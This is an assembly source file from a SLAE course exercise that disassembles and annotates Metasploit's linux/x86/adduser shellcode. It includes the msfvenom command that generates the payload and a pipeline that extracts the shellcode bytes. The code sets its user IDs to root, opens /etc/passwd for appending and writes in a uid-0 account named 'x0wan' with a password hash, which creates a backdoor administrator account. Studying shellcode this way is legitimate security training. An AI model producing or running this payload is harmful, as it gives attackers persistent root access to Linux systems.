; Filename:      linux_x86_adduser.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  07.12.2018
; Note:          MSF: payload/linux/x86/adduser
; Disassembler:  msfvenom -p linux/x86/adduser USER=x0wan PASS=Passw0rd SHELL=/bin/zsh  -a x86 --platform linux -f raw | ndisasm -u - | cut -c 29-50
; Assembler:     nasm -f elf32 linux_x86_adduser.nasm -o linux_x86_adduser.o
; Linker:        ld -N -m elf_i386 linux_x86_adduser.o -o linux_x86_adduser
; Assembly dump: objdump -d ./linux_x86_adduser|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'


global _start

section .text

_start:

; setreuid, setregid - set real and/or effective user or group ID
; http://man7.org/linux/man-pages/man2/setreuid.2.html
; int setreuid(uid_t ruid, uid_t euid);

xor ecx,ecx                      ; Clear ecx register
mov ebx,ecx                      ; Clear ebx register
push byte +0x46                  ; Push 0x00000046 in stack
pop eax                          ; Load in eax 0x00000046
int 0x80                         ; syscal sys_setreuid (70)  uid_t=0 euid=0

; open, openat, creat - open and possibly create a file
; http://man7.org/linux/man-pages/man2/open.2.html
; int open(const char *pathname, int flags);

push byte +0x5                   ; Push 0x00000005 in stack
pop eax                          ; eax = 0x00000005
xor ecx,ecx                      ; Clear ecx register
push ecx                         ; Push 0x00000000 in stack (Null byte for string)
push dword 0x64777373            ; "dwss"
push dword 0x61702f2f            ; "ap//"
push dword 0x6374652f            ; "cte/"  = /etc/passwd
mov ebx,esp                      ; Set pointer to string in ebx
inc ecx                          ; ecx = 0x00000001
mov ch,0x4                       ; ecx = 0x00000401
int 0x80                         ; syscall sys_open (5) pathname=/etc/passwd flags=1025

xchg eax,ebx                     ; Save file descriptor in EBX
call 0x4f                        ; Set EIP at the end of the string (36 Bytes) and push the return address to the stack

js 0x5d                          ; "x0"
ja 0x90                          ; ...
outsb                            ; ...
cmp al,[ecx+0x7a]                ; ...
ss inc esp                       ; ...
insb                             ; ...
inc ebp                          ; ...
bound edx,[ebp+0x69]             ; ...
insd                             ; ...
o16 js 0x74                      ; x0wan:Az6DlEbUimfx6:0:0::/:/bin/zsh\n
cmp dh,[eax]                     ; ...
cmp dh,[eax]                     ; ...
cmp bh,[edx]                     ; ...
das                              ; ...
cmp ch,[edi]                     ; ...
bound ebp,[ecx+0x6e]             ; ...
das                              ; ...
jpe 0xc0                         ; ...
push dword 0x518b590a            ; "h\n"  \x59\x0A = pop ecx (return address)
cld                              ; Wrong translation from disassembler due to our string after the call instruction
push byte +0x4                   ;
pop eax                          ;
int 0x80                         ;
push byte +0x1                   ;
pop eax                          ;
int 0x80                         ;

; write - write to a file descriptor
; http://man7.org/linux/man-pages/man2/write.2.html
; ssize_t write(int fd, const void *buf, size_t count);

; pop    ecx                         ; (return address string)
;	mov    edx,DWORD PTR [ecx-0x4]     ; edx = size_t = 0x24 = 36 Bytes
;	push   0x4                         ;
;	pop    eax                         ; eax = 4
;	int    0x80                        ; syscall sys_write ebx=3 ecx=string edx=36

;	push   0x1                         ;
;	pop    eax                         ; eax = 1
;	int    0x80                        ; syscall sys_exit
